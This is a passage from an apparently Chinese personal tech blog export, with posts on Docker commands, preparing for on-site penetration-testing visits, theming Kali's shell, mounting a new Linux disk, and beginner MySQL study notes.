容器名称 #停止容器docker container rm 容器ID 或 容器名称 #删除容器docker rm 容器ID 或 容器名称 #删除容器docker container logs -f 容器ID 或 容器名称 #查看容器日志docker exec -it name /bin/bash #进入name（容器名/id）中开启交互式的终端，exit退出 docker --help 中文译解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061Usage:docker [OPTIONS] COMMAND [arg...] docker daemon [ --help | ... ] docker [ --help | -v | --version ]Aself-sufficient runtime for containers. Options: --config=~/.docker Location of client config files #客户端配置文件的位置 -D, --debug=false Enable debug mode #启用Debug调试模式 -H, --host=[] Daemon socket(s) to connect to #守护进程的套接字（Socket）连接 -h, --help=false Print usage #打印使用 -l, --log-level=info Set the logging level #设置日志级别 --tls=false Use TLS; implied by--tlsverify # --tlscacert=~/.docker/ca.pem Trust certs signed only by this CA #信任证书签名CA --tlscert=~/.docker/cert.pem Path to TLS certificate file #TLS证书文件路径 --tlskey=~/.docker/key.pem Path to TLS key file #TLS密钥文件路径 --tlsverify=false Use TLS and verify the remote #使用TLS验证远程 -v, --version=false Print version information and quit #打印版本信息并退出 Commands: attach Attach to a running container #当前shell下attach连接指定运行镜像 build Build an image from a Dockerfile #通过Dockerfile定制镜像 commit Create a new image from a container&#x27;s changes #提交当前容器为新的镜像 cp Copy files/folders from a container to a HOSTDIR or to STDOUT #从容器中拷贝指定文件或者目录到宿主机中 create Create a new container #创建一个新的容器，同run 但不启动容器 diff Inspect changes on a container&#x27;s filesystem #查看docker容器变化 events Get real time events from the server#从docker服务获取容器实时事件 exec Run a command in a running container#在已存在的容器上运行命令 export Export a container&#x27;s filesystem as a tar archive #导出容器的内容流作为一个tar归档文件(对应import) history Show the history of an image #展示一个镜像形成历史 images List images #列出系统当前镜像 import Import the contents from a tarball to create a filesystem image #从tar包中的内容创建一个新的文件系统映像(对应export) info Display system-wide information #显示系统相关信息 inspect Return low-level information on a container or image #查看容器详细信息 kill Kill a running container #kill指定docker容器 load Load an image from a tar archive or STDIN #从一个tar包中加载一个镜像(对应save) login Register or log in to a Docker registry#注册或者登陆一个docker源服务器 logout Log out from a Docker registry #从当前Docker registry退出 logs Fetch the logs of a container #输出当前容器日志信息 pause Pause all processes within a container#暂停容器 port List port mappings or a specific mapping for the CONTAINER #查看映射端口对应的容器内部源端口 ps List containers #列出容器列表 pull Pull an image or a repository from a registry #从docker镜像源服务器拉取指定镜像或者库镜像 push Push an image or a repository to a registry #推送指定镜像或者库镜像至docker源服务器 rename Rename a container #重命名容器 restart Restart a running container #重启运行的容器 rm Remove one or more containers #移除一个或者多个容器 rmi Remove one or more images #移除一个或多个镜像(无容器使用该镜像才可以删除，否则需要删除相关容器才可以继续或者-f强制删除) run Run a command in a new container #创建一个新的容器并运行一个命令 save Save an image(s) to a tar archive#保存一个镜像为一个tar包(对应load) search Search the Docker Hub for images #在dockerhub中搜索镜像 start Start one or more stopped containers#启动容器 stats Display a live stream of container(s) resource usage statistics #统计容器使用资源 stop Stop a running container #停止容器 tag Tag an image into a repository #给源中镜像打标签 top Display the running processes of a container #查看容器中运行的进程信息 unpause Unpause all processes within a container #取消暂停容器 version Show the Docker version information#查看容器版本号 wait Block until a container stops, then print its exit code #截取容器停止时的退出状态值 Docker 图片 未完待续……","categories":["网络安全"]},{"title":"去客户现场需要知道什么","path":"/2022/02/09/去客户现场需要知道什么/","content":"无论去现场是做渗透测试、漏洞扫描，亦或是操作服务器进行 PoC 验证等工作，都需要充分的准备。 一、物品准备 必备硬件： 电脑、充电器、鼠标 转接头： 务必携带带网口的转接头，确保与你的电脑兼容，以便接入客户网络，我购买的是绿联的多功能转接口（同时有HDMI、网口、Type-c、USB）。下面是我网上找的图片，关键在于转接头必须配备网口。 U盘： 准备一个U盘，用于传输文件或作为系统启动盘，以备不时之需。 移动硬盘： 如果需要保存大量数据，建议携带移动硬盘，或者借助阿里云OSS等云存储方案解决。 身份证明： 身份证： 许多央企、国企、金融机构对人员出入有严格的安全管理规定。他们可能会要求扣留身份证，发放通行卡，或者填写详细的登记表（包括姓名、身份证号、手机号、公司信息、访问目的等）。这些流程一般会发生在公司前台或大门口的保安处。 着装要求： 干净整洁： 以干净整洁为宜，无需过于正式。 时间安排： 先聊好时间： 一定要提前和销售或客户敲定具体时间，顺便打听下他们的上下班制度，或者直接google、小红书、Boss都能搜得到。 上海这边呢，大部分公司都是 9 点、9 点半或 10 点上班。一般没有约定确切时间的话，我会按 9 点半为一个基准。不过啊，有些金融公司可能 8 点半就开工了，还是要看情况。 二、现场工作 网络接入： 首要任务： 到达现场后，首要任务是解决网络连接问题。 接入方式： 会议室： 一般情况下，客户会安排在会议室施展工作，会议室通常提供网络接口。 工位： 有些公司允许直接在工位上接入网络，尤其是一些基金公司，办公桌上即配备有网络口。 配置信息： 根据客户提供的 IP 地址、子网掩码、网关、DNS 等信息配置网络。 零信任/VPN： 少数情况下，客户可能会要求接入零信任网络或 VPN，但这种情况较少，因为远程接入通常也能完成工作的话，那为什么要去现场呢？ 环境熟悉： 卫生间、茶水间位置： 尽快了解卫生间的位置，以及哪里可以接水，有的提供纸杯或者矿泉水；如果卫生间没有蹲便，可以带上一次性马桶套，注意卫生，尤其是女孩子。 午餐安排： 提前规划好午餐地点，或点外卖；如果有把握在客户下班前一小时弄完的话，建议出去溜达溜达在外面吃，也顺便走走路，运动一下，看一下周边环境面貌，难得来一次，抱着&quot;处处是风景&quot;的心态，放轻松。 漏洞扫描： 以下是一个漏扫案例，对方企业内网按业务、办公等，划分了多个子网（如 192.168.9.0/24 是办公网，172.168.1.0/24 是服务器网） 对方指示先扫描 192.168.9.0/24 网段，即9网段内的所有IP地址。因此，需要打开设置，在网络和 Internet，看到以太网，将电脑配置为：IP地址 192.168.9.40，子网掩码 255.255.255.0 (由 /24 决定)，以及网关 192.168.9.252。 最后，尝试 ping 网关地址， ping 192.168.9.252，如果能 ping 通，则表示网络连接正常，接下来可进行测试了…… 如下信息，如法炮制即可 服务器安装软件和渗透测试准备工作 在前往客户现场进行私有化产品安装或渗透测试时，为避免浪费时间。对于服务器安装，需提前下载所需安装包并存储在U盘中，或者让客户oss、百度网盘先下载到本地，到时候进行传输。 同时，准备必要的硬件设备，如显示器、带接收器的鼠标、键盘和显示器连接线等。一般这些客户现场也会有，但难保意外。 了解服务器的具体情况也很重要，包括是否已安装操作系统、是否需要重新安装、如何在服务器上传文件以及网络配置等。 对于渗透测试，按照常规测试即可，晚上照常反馈，建议和客户对话过程中，不要轻易给结论。 懒得写了，其他想到再说吧……","tags":["现场实施"],"categories":["网络安全"]},{"title":"Kali Linux 美化","path":"/2021/08/09/kali linux 美化/","content":"oh-my-zsh 12345678910111213141516171819202122232425262728// 先更新一下apt-get updateapt-get upgrade// 安装 zsh，查看当前系统使用的 shellecho $SHELL// 查看系统是否安装了 zshcat /etc/shells// 用 yum 安装 zshyum -y install zsh// 切换 shell 为 zshchsh -s /bin/zsh// 修改主题vim ~/.zshrc// 将 ZSH_THEME 改成 agnoster// 主题列表——https://github.com/ohmyzsh/ohmyzsh/wiki/themesZSH_THEME=&quot;agnoster&quot;// 重启后，查看当前shellsource ~/.zshrc // 默认主题ZSH_THEME=&quot;robbyrussell&quot; vim 后1234// 进入 vim 后iEsc:wq 自动补齐插件 1$ wget http://mimosa-pudica.net/src/incr-0.2.zsh 编辑器 sublime（notepad++只有win）","tags":["kali","linux"]},{"title":"挂载扩容 Linux 服务器","path":"/2021/06/09/挂载扩容linux服务器/","content":"需求 Linux 服务器硬盘从 300G 扩容到 500G /etc/fstab 持久性挂载 一、确认当前磁盘状态 使用 df -h 命令确认目前的空间状态。 12345678[root@hostname ops]# df -hFilesystem Size Used Avail Use% Mounted ondevtmpfs 7.8G 0 7.8G 0% /devtmpfs 7.8G 4.0K 7.8G 1% /dev/shmtmpfs 7.8G 17M 7.8G 1% /runtmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup/dev/vda1 300G 1.4G 299G 1% /tmpfs 1.6G 0 1.6G 0% /run/user/201 二、确认新磁盘 使用 lsblk 命令来确认新磁盘是否被正确识别——发现新磁盘被正常识别到。 12345[root@hostname ops]# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTvda 253:0 0 300G 0 disk └─vda1 253:1 0 300G 0 part /vdb 253:16 0 200G 0 disk 可以发现 /dev/vdb 是新分区。 使用 fdisk 命令确认磁盘信息。 12345678910111213141516[root@hostname ops]# sudo fdisk -lDisk /dev/vda: 322.1 GB, 322122547200 bytes, 629145600 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x000b0d11 Device Boot Start End Blocks Id System/dev/vda1 * 2048 629145566 314571759+ 83 LinuxDisk /dev/vdb: 214.7 GB, 214748364800 bytes, 419430400 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes 三、创建文件系统 确认文件系统，发现新分区没有文件系统。 123[root@hostname ops]# lsblk -f /dev/vdbNAME FSTYPE LABEL UUID MOUNTPOINTvdb 创建 ext4 文件系统。 1sudo mkfs.ext4 /dev/vdb 四、挂载新分区 创建挂载点。 1sudo mkdir /mnt/new_disk 运行以下命令将新分区挂载到创建的目录。 1[root@hostname ops]# sudo mount /dev/vdb /mnt/new_disk 如果出现错误提示，例如“mount: unknown filesystem type ‘(null)’”，请确认文件系统已经正确创建。 验证新分区是否成功挂载 运行 df -h 命令确认新分区是否已经成功挂载，并且你能够看到新的空间。 123456789[root@hostname ops]# df -hFilesystem Size Used Avail Use% Mounted ondevtmpfs 7.8G 0 7.8G 0% /devtmpfs 7.8G 4.0K 7.8G 1% /dev/shmtmpfs 7.8G 17M 7.8G 1% /runtmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup/dev/vda1 300G 1.4G 299G 1% /tmpfs 1.6G 0 1.6G 0% /run/user/201/dev/vdb 197G 61M 187G 1% /mnt/new_disk 五、持久化挂载 为了在系统重启后自动挂载新分区，需要在 /etc/fstab 文件中添加相应的配置。 1. 备份 fstab 文件 1sudo cp /etc/fstab /root/fstab_backup 2. 编辑 fstab 文件 打开 /etc/fstab 文件进行编辑： 1sudo vim /etc/fstab 在文件末尾添加一行，描述新分区的挂载信息。对于 ext4 文件系统，行可能是这样的： 123456789## /etc/fstab# Created by anaconda on Fri Oct 30 14:22:27 2020## Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info#UUID=9cff3d69-3769-4ad9-8460-9c54050583f9 / xfs defaults 0 0/dev/vdb /mnt/new_disk ext4 defaults 0 0 六、重启验证 重启服务器看是否持久化挂载。 1sudo reboot 七、重启后确认挂载 使用 df -h 命令确认新分区是否已经成功挂载，并且你能够看到新的空间。 123456789[ops@hostname ~]$ df -hFilesystem Size Used Avail Use% Mounted ondevtmpfs 7.8G 0 7.8G 0% /devtmpfs 7.8G 4.0K 7.8G 1% /dev/shmtmpfs 7.8G 17M 7.8G 1% /runtmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup/dev/vda1 300G 1.4G 299G 1% //dev/vdb 197G 61M 187G 1% /mnt/new_disktmpfs 1.6G 0 1.6G 0% /run/user/201 总结 通过以上步骤，将 Linux 服务器的硬盘从 300G 扩容到 500G，并配置了持久性挂载，能够确保服务器在重启后新磁盘仍然可用。","tags":["Linux"]},{"title":"SQL 数据库学习记录","path":"/2021/02/11/数据库/","content":"数据库查缺补漏 #是一个占位符 使用占位符可以防止sql的注入，#&#123;&#125;会将传入的数据当成一个字符串，会对自动传入的数据加一个双引号，$&#123;&#125;会将传入的数据直接显示生成在sql中 $是拼接符（参数） $&#123;&#125;:传入的内容会直接拼接，不会加上引号，可能存在sql注入的安全隐患 %是搜索的通配符，Window 中是* mysql中#{}和${}的区别详解_Mysql_脚本之家 (jb51.net) 初识数据库 介于前端和后端之间的数据库，是***其***核心所在。 为什么学习数据库： 岗位需求；技术大框架中的不可或缺的”数据存储“需要；网络安全 什么是数据库： 数据库（DB，DataBase） 概念：数据仓库，软件，安装在操作系统（window、linux、mac…）之上！SQL,可以存储大量的数据。500万！ 作用：存储数据，管理数据 数据库分类： 关系型数据库：（SQL） MySQL、Oracle、SqIServer、DB2、SQLlite 通过表和表之间，行和列之间的关系进行数据的存储， 非关系型数据库：（NoSQL）Not Only Redis，MongDB 非关系型数据库，对象存储，通过对象的自身的属性来决定。 DBMS（数据库管理系统） 数据库的管理软件，科学有效的管理我们的数据。维护和获取数据， MySQL，数据库管理系统 MySQL 简介 MySQL 是一个关系型数据库管理系统 🔴最流行的开源数据库是MySQL 历史沿革：瑞典 MySql AB 公司 如今：属于 Oracle 旗下产品 安装建议： 尽量不使用 exe ，注册表，卸载麻烦 建议使用使用压缩包 安装 MySQL MySQL :: Download MySQL Community Server 谷歌搜索：mysql community 解压后放到电脑环境目录下 配置环境变量，按 Win 键搜索，环境变量将bin目录放入 在mysql的一级目录下，新建mysql 配置文件 my.ini [mysqld] # 设置3306端口号 port=3306 # 设置MySQL的安装目录 basedir=D:\\\\software\\\\an qr\\\\mysql-8.0.31-winx64 # 设置MySQL数据库的数据存放目录 datadir=D:\\\\software\\\\an qr\\\\mysql-8.0.31-winx64\\\\data # 启动mysql后将skip-grant-tables前面的#删掉 skip-grant-tables 123456789101112131415161718192021222324 4. 在`bin`目录下，以管理员身份启动`CMD` 1. ```mysql # 安装 mysql，显示 Service successfully installed. 即为成功 mysqld -install # 出现 data 文件夹，初始化数据文件 mysqld --initialize-insecure --user=mysql # 启动 mysql net start mysql net stop mysql # 进入 mysql mysql -u root -p mysql -u root -proot mysql -u root -p紧紧跟着密码 # 进入记得修改密码，可以注释掉跳过密码了，然后重启 net stop mysql net start mysql 连接数据库 1234567891011121314151617181920212223242526mysql -uroot -proot -- 命令行连接-- sql 的注释是flush privileges; -- 刷新权限---------------------------所有的语句使用`;`结尾show databases; -- 查看所有的数据库use mysql; -- 切换数据库Database changedshow tables; -- 查看数据表中所有的表describe student; -- 显示数据库中所有表的信息create database westos; -- 创建一个数据库exit; -- 退出连接-- 单行注释（SQL 的本来的注释）/* （sql 的单行注释）hellohi*/ 操作数据库 简单操作数据库 操作数据库 &gt; 操作数据库中的表 &gt; 操作数据库中表的数据 mysql关键字不分区大小写 123456789101112-- 创建数据库CREATE DATABASE IF NOT EXISTS westos-- 删除数据库DROP DATABASE IF EXISTS westos-- 使用数据库-- tab键的上而，如果你的表名或者字段名是一个特殊字符，就需要带``USE `school`-- 查看所有的数据库SHOW DATABASES; 对比SQLyog的可视化历史记录查看 固定的语法或关键字必须要记住！ 数据库的列类型 数值 tinying，十分大小数据，1 个字节 smallint，较小的数据，2 个字节 mediumint，中等大小的数据，3 个字节 int，标准的整数，4 个字节 bigint，较大的数据，8 个字节 float，浮点数，4 个字节 double，浮点数，4 个字节 decimal，字符串形式的浮点数，金融计算的时候，一般是使用 decimal 字符串 char，字符串固定大小的，0~244 varchar，可变字符串，0~65535（常用的变量 String） tinytext，微型文本，2^8-1 text，文本串，2^16-1，保存大文本 时间日期 java.util.Date date，YYYY-MM-DD，日期格式 time，HH：mm：ss，时间格式 datetime，YYYY-MM-DD HH：mm：ss，最常用的时间格式 小写的 h 是 12 小时制，大写的 H 是 24 小时制 timestamp，时间戳，1970.1.1 到现在的毫秒数！也较为常用！ year，年份表示 null 没有值，未知 注意：不要使用 NULL 进行计算，结果为 NULL 字段属性 UNsigned： 无符号整数 声明的该列不能声明未负数 zerofill： 0 填充的 不足的位数，使用 0 来填充，int（3），5 — 005 自增 通常理解为自增，自动在上一条记录的基础上+1（默认） 通常用来设计唯一的主踺~index，必须是整数类型 可以自定义设主键自增的起始值和步长 非空 Null not null 假设设置为 not null，如果不给他赋值，就会报错 NUII 如果不填写值，默认就是nu旧 拓展：听听就好 123456789/ *每一个表，都必须存在以下五个字段id 主键`version` 乐观锁is_delete 伪删除gmt_create 创建时间gmt_update 修改时间*/ 创建数据库表 1234567891011121314151617181920212223show databases;-- 目标：创建一个 school 数据库-- 创建学生表（列，字段）使用 SQL 创建-- 学号 int，登录密码 varchar（20）.出生日期（datatime）,家庭住址，email-- 注意点，使用英文括号，表的名称和字段使用``，避免识别为关键字-- AUTO_INCREMENT 自增-- 字符串使用单引号括起来！-- 所有语句后面加英文的逗号，最后一个不用加-- PARMARY KEY 主键，一般一个表只有一个唯一的主键CREATE DATABASE school;USE school;CREATE TABLE IF NOT EXISTS `student`( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT &#x27;学号&#x27;, `name` VARCHAR(30) NOT NULL DEFAULT &#x27;匿名&#x27; COMMENT &#x27;姓名&#x27;, `pwd` VARCHAR(20) NOT NULL DEFAULT &#x27;123456&#x27; COMMENT &#x27;密码&#x27;, `sex` VARCHAR(2) NOT NULL DEFAULT &#x27;女&#x27; COMMENT &#x27;性别&#x27;, `birthday` DATETIME DEFAULT NULL COMMENT &#x27;出生日期&#x27;, `address` VARCHAR(100) DEFAULT NULL COMMENT &#x27;家庭住址&#x27;, `email` VARCHAR(50) DEFAULT NULL COMMENT &#x27;邮箱&#x27;, PRIMARY KEY(`id`))ENGINE=INNODB DEFAULT CHARSET=utf8 格式 123456CREATE DATABASE [IF NOT EXISTS] `表明`(`字段名` 列类型 [属性] [索引] [注释]，`字段名` 列类型 [属性] [索引] [注释]， ……`字段名` 列类型 [属性] [索引] [注释]，)[表类型][字符集设置][注释] 常用命令 123SHOW CREATE DATABASE school -- 查看创建数据库的语句SHOW CREATE TABLE student -- 查看数据库表的定义语句DESC student -- 显示表的结构 数据表的类型 12345-- 关于数据库引擎/*INNODB 默认使用~MYISAM 早些年使用的*/ MYISAM INNODB 事务支持 不支持 支持 数据行锁定 不支持 支持 外键约束 不支持 支持 全文索引 支持 不支持 表空间的大小 较小 较大，约为 2 倍 常规使用操作 MYISAM，节约空间，速度较快 INNODB，安全性高，事务的处理，多表多用户操作 在物理空间存在的位置： 所有的数据库文件都存在 date 目录下 本质还是文件的存储 MySQL 引擎在物理文件上的区别 INNODB，在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1 文件 MYISAM 对应的文件 *.frm表结构的定义文件 *.MYD数据文件（data） *.MYI索引文件 设置数据库表的字符集编码 1CHARSET=utf8 不设置的话，会是mysql 默认的字符集编码（不支持中文） 在my.ini中配置默认的编码 1character-set-server=utf8 修改删除表 修改 12345678910111213141516-- 修改表名：ALTER TABLE 旧表名 RENAME SA 新表名-- teacher 改为 teacher1ALTER TABLE teacher RENAME AS teacher1-- 增加表的字段：ALTER TABLE 表名 ADD 字段名 列属性ALTER TABLE teacher1 ADD age INT(11)-- 修改表的字段（重命名，修改约束！）-- ALTER TABLE 表名 MODIFY 字段名 列属性ALTER TABLE teacher1 MODIFY age VARCHAR(11) -- 修改约束-- ALTER TABLE 表名 CHANGE 旧名字 新名字 列属性[]ALTER TABLE teacher1 CHANGE age age1 INT(1) -- 字段重命名-- 删除表的字段：ALTER TABLE 表名 DROP 字段名ALTER TABLE teacher1 DROP age1 删除 12-- 删除表（存在再删除）DROP TABLE IF EXISTS teacher1 所有的创建和删除尽量加上判断，以免报错 注意点： 反引号`` 字段名，使用这个包裹 注释： -- /**/ 关键字大小写不敏感，建议使用小写（大写看不明白单词意思） 所有符合全部使用英文！ MySQL 的数据管理 外键（了解即可） 方式一：在创建表的时候，增加约束（麻烦，比较复杂） 12345678910111213141516-- 学生表的 gradeid 字段，要去引用年级表的 gradeid-- 定义外键key-- 给这个外键添加约束（执行引用） reference 引用CREATE TABLE IF NOT EXISTS `student`( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT &#x27;学号&#x27;, `name` VARCHAR(30) NOT NULL DEFAULT &#x27;匿名&#x27; COMMENT &#x27;姓名&#x27;, `pwd` VARCHAR(20) NOT NULL DEFAULT &#x27;123456&#x27; COMMENT &#x27;密码&#x27;, `sex` VARCHAR(2) NOT NULL DEFAULT &#x27;女&#x27; COMMENT &#x27;性别&#x27;, `birthday` DATETIME DEFAULT NULL COMMENT &#x27;出生日期&#x27;, `gradeid` INT(10) NOT NULL COMMENT &#x27;学生的年级&#x27;, `address` VARCHAR(100) DEFAULT NULL COMMENT &#x27;家庭住址&#x27;, `email` VARCHAR(50) DEFAULT NULL COMMENT &#x27;邮箱&#x27;, PRIMARY KEY(`id`), KEY `FK_gradeid` (`gradeid`), CONSTRAINT `FK_gradeid` FOREIGN KEY (`gradeid`) REFERENCES `grade` (`gradeid`))ENGINE=INNODB DEFAULT CHARSET=utf8 删除有外键关系的表的时候，必须要先删除引用别人的表（从表），再删除被引用的表（主表） 以上的操作都是物理外键，数据库级别的外键，我们不建议使用！（避免数据库过多造成困扰） 最佳实践： 数据库就是单纯的表，只用来存数据，只有行（数据）和列（字段） 我们想要使用多张表的数据，想使用外键（程序去实现） 其实这个话是老生常谈，很多人在工作中确实也不会使用外键，包括在阿里的JAVA规范中也〖强制〗不得使用外键与级联，一切外键既念必须在应用层解决 但是呢，洵问他们原因，大多是这么回答的 每次做DELETE或者UPDATE必须考虑外键约束会导致开发的时候很痛苦，测过极为不方便 DML 语言（全部记住） 数据库的意义：数据存储，数据管理 DML 语言：数据库操作语言 insert update delete 添加 insert 1234567891011121314151617-- 插入语句（添加）-- insert into 表名([字段名1,字段名2,字段名3]) values(&#x27;值1&#x27;),(&#x27;值2&#x27;),(&#x27;值3&#x27;),...)INSERT INTO `grade` (`gradename`) VALUES(&#x27;大四&#x27;)-- 由于主键自增我们可以省略字段名，但是它会一一匹配，所以参数必须包含所有字段的值INSERT INTO `grade` VALUES (3, &#x27;大三&#x27;)-- 插入多个字段INSERT INTO `grade`(`gradename`) VALUES(&#x27;大一&#x27;),(&#x27;大二&#x27;)INSERT INTO `student`(`name`) VALUES(&#x27;张三&#x27;)INSERT INTO `student`(`name`,`pwd`,`sex`) VALUES(&#x27;张三&#x27;,&#x27;aaaaaa&#x27;,&#x27;男&#x27;)INSERT INTO `student`(`name`,`pwd`,`sex`)VALUES(&#x27;李四&#x27;,&#x27;aaaaaa&#x27;,&#x27;男&#x27;),(&#x27;王五&#x27;,&#x27;bbbbbb&#x27;,&#x27;男&#x27;) 语法：insert into 表名([字段名1,字段名2,字段名3]) values(‘值1’),(‘值2’),(‘值3’),…) 注意事项： 字段和字段之间使用，英文逗号隔开 字段是可以省略的，但是后面的值必须要一一对应，不能少 可以同时插入多条数据，VALUES后面的值，需要使用，隔开即可VALUES(),(),... 修改 update 12345678910111213141516-- update 修改谁 （条件） set 原来的值=新值-- 修改学员的名字，把 id = 1 的这个人的名字改为张三update `student` set `name`=&#x27;张三&#x27; where id = 1;-- 不指定条件的情况下，改动所有的表update `student` set `name`=&#x27;猫龙&#x27;-- 语法：-- update 表名 set colnum_name = value where [条件]-- 修改多个属性，逗号隔开update `student` set `name`=&#x27;狗龙&#x27;,`email`=&#x27;208329492@qq.com&#x27; where id = 1;-- 语法：-- update 表名 set colnum_name = value,[colnum_name = value,,] where [条件] 条件：where 字句 运算符 id 等于某个值，在某个区间内修改 操作符会返回布尔值 操作符 含义 范围 结果 = 等于 &lt;&gt; 或 != 不等于 &gt; &lt; &gt;= &lt;= BETWEEN…AND… 闭合空间内 AND 与 OR 或 123-- 多个条件定位数据-- 把性别为女姓名为华的这个人的名字改为“小树”update `student` set `name`=&#x27;小树&#x27; where `name`=&#x27;华&#x27; and sex = &#x27;女&#x27; 语法：update 表名 set colnum_name =value,[colnum_name =value] where [条件] 注意： colnum_name 是数据库的列，尽量带上`` 条件，筛选的条件，如果没有指定，则会修改所有的列 value，是一个具体的值，也可以是一个变量 多个设置的属性之间，使用英文逗号隔开 1update `student` set `birthday` = current_time where `name`=&#x27;小树&#x27; and sex=&#x27;男&#x27; 删除 delete 语法：delete from 表名 [where 条件] 12345-- 删除数据(避免这样写，有专门的删库方法)delete from `student`-- 删除指定数据delete from `student` where id = 1; TRUNCATE 作用：完全清空一个数据库表，表的结构和索引约束不会变 12-- 清空 student 表truncate `student` delete 和 truncate 的区别 相同点：都能删除数据，都不会删除表的结构 不同 truncate 重新设置，自增列，计数器会清零 truncate 不会影响事务 1234567891011121314151617181920212223-- 测试 delete 和 truncate 的区别-- 查看数据库SHOW DATABASES;-- 使用数据库use `mysql`;-- 查看数据表 -- 创建表格create table `test`(\t`id` int(4) not null auto_increment, `coll` varchar(20)not null, primary key(`id`))engine=innodb default charset=utf8-- 插入数据insert into `test`(`coll`) values(&#x27;1&#x27;),(&#x27;2&#x27;),(&#x27;3&#x27;);-- 删除表，不会影响自增delete from `test`;-- 删除表，自增归零truncate table `test`; 了解即可：delete 删除的问题，重启数据库，现象 innodb 自增列会从 1 开始（存在内存当中，断点即失） myisam 继续从上一个自增量开始（存在文件中不会丢失） DQL 查询数据（最重点） DQL Date Query Language ：数据查询语言 所有的查询操作都用它，select 选择 简单查询，复杂查询 :warning:数据库中最核心的语言 使用频率最高 指定查询字段 数据库 school grade result student subject 12345678910111213-- 查询全部的学生，select 字段 from 表select * from student-- 查询全部的成绩selsct * from result-- 查询指定字段select `StudentNo`,`StudentName` from student-- 别名，给结果起名字，ASselect `StudentNo` AS 学号,`StudentName` AS 姓名 from student AS s-- 函数 concat（a,b）select concat(&#x27;姓名：&#x27;，StudentName) AS 新名字 from student 语法：select 字段，，，from 表 有的时候，列名字不明朗，可以起别名 字段名 AS 别名，表名 AS 别名 去重 distinct： 作用：去除 select 查询出来的结果中重复的数据 12345678910111213141516select * from result -- 查询全部的成绩-- 查询一下有哪些同学参加了考试select `StudentNo` from result-- 发现重复数据，result 数据表中的 StudentNo 列的重复数据通过 distinct 去重select distinct `StudentNo` from result-- 查看系统的版本select version()select 100*3-1 AS 计算结果-- 查询自增的步长select @@auto_increment_increment-- 给所有学生成绩加一分select `StudentNo`,`StudentResult +1` AS &#x27;提分后&#x27; from result 数据库中的表达式：文本值，列，Null，函数，计算表达式，系统变量 select 表达式 where 条件字句 作用：检索数据库中符合条件的值 逻辑运算符： 搜索的条件由一个或多个表达式组成，结构布尔值 运算符 语法 描述 and &amp; a and b a&amp;&amp;b 逻辑与，两个为真结果为真 or ` ` Not ! not a !a 逻辑非，真为假，假为真 尽量使用英文字母 123456789101112131415-- 查询学生的成绩select studentNo,`studentResult` from result-- 查询学生的成绩在 95-100 之间的select studentNo,`studentResult` from result where studentResult&gt;=95 and studentResult&lt;=100select studentNo,`studentResult` from result where studentResult&gt;=95 &amp;&amp; studentResult&lt;=10-- 模糊查询（区间）select studentNo,`studentResult` from result where between 95 and 100-- 除了 1000 号学生之外学生的成绩select studentNo,`studentResult` from result where studentNo!=1000select studentNo,`studentResult` from result where not studentNo = 1000 比较运算符 模糊查询 运算符 语法 描述 is null a is null 如果操作符为 null，则结果为真 is not null a is not null 如果操作符为 not null，则结果为真 between a between b and c a 在 b 和 c 之间，结果为真 like a like b SQL 匹配，a 匹配到 b，结果为真 in a in(a1,a2,a3) 假设 a 在 a1……其中的一个值中，结果为真 12345678910111213141516171819202122232425262728293031323334353637383940-- 查询姓刘的同学-- like（% 是 0 到任意一个字符）（_ 是一个字符）select `studentNo`,`studentName` from `student`where studentName like &#x27;刘%&#x27;-- 查询姓刘的同学，名字后面只有一个字的select `studentNo`,`studentName` from `student`where studentName like &#x27;刘_&#x27;-- 查询姓刘的同学，名字后面只有两个字的select `studentNo`,`studentName` from `student`where studentName like &#x27;刘__&#x27;-- 查询名字中间有嘉字的同学 %嘉%select `studentNo`,`studentName` from `student`where studentName like &#x27;%嘉%&#x27;-- --------- in（具体的一个或多个值） -------------- 查询 1001 1002 1003 号学员信息select `studentNo`,`studentName` from `student`where studentNo in (1001,1002,1003);-- 查询在北京的学员信息select `studentNo`,`studentName` from `student`where `adress` in (&#x27;北京&#x27;)-- ---------- null not null --------------- 查询地址为空的学生select `studentNo`,`studentName` from `student`where `adress`=&#x27;&#x27; select `studentNo`,`studentName` from `student`where `adress` or `adress` is null-- 查询有出生日期的同学，is not null 不为空select `studentNo`,`studentName` from `student`where `borndate` is not null-- 查询没有出生日期的同学，is null 为空select `studentNo`,`studentName` from `student`where `borndate` is null 联表查询 JOIN 对比： 操作符名称 描述 Inner join 如果表中有至少一个匹配，则返回行 left join 从左表中返回所有的行，即使右表中没有匹配 right join 从右表中返回所有的行，即使左表中没有匹配 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/*连接查询 如果需要多张数据表的数据进行查询，则可通过连接运算符实现多个查询- 内连接 inner join 查询两个表中的结果集中的交集- 外连接 outer join - 左外连接 left join 以左表作为基准，右表来一一匹配，匹配不上的，返回左表的记录，右表以NULL填充 - 右外连接 right join 以右表作为基准，左表来一一匹配，匹配不上的，返回右表的记录，左表以NULL填充*//*1.分析需求，分析查询的字段来自哪些表2.确定使用哪种连接查询：7选3.确定交叉点（这两个表中哪个数据是相同的）4.判断的条件： 学生表中 studentNo = 成绩表中 studentNo*/-- ==========联表查询============-- Join（表）on (判断的条件) 连接查询-- where 等值查询SELECT s.studentno, studentname, subjectno, studentresultFROM student AS sINNER JOIN result AS rWHERE s.`studentno` = r.`studentno`-- right joinSELECT s.studentno, studentname, subjectno, studentresultFROM student AS sRIGHT JOIN result AS rON r.`studentno` = s.`studentno`-- left 左连接（查询所有同学，不考试的也会查出来）SELECT s.studentno, studentname, subjectno, studentresultFROM student sLEFT JOIN result rON s.`studentno` = r.`studentno`-- 查缺考的同学（左连接应用场景）SELECT s.studentno, studentname, subjectno, studentresultFROM student sLEFT JOIN result rON s.`studentno` = r.`studentno`WHERE studentresult IS NULL-- 思考题：查询参加了考试的同学信息（学号，学生姓名，科目名，分数）SELECT s.`studentno`, 